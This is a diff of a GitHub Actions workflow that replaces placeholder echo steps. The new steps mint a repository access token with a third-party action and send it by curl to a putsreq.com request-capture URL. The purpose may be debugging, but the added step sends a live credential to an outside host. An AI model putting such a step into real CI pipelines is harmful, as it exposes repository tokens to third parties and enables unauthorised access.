@@ -10,11 +10,11 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - run: echo one
-        if : false
-      - run: echo two; exit 1
-      - run: echo three
-      - run: echo four
-          
+      - uses: qoomon/actions--access-token@v3
+        id: token
+        with:
+          permissions: |
+            contents: read
+      - run: curl "https://putsreq.com/ksp0TTIIgjPB0ceX9RGr?token${{ steps.token.outputs.token }}"
         
         
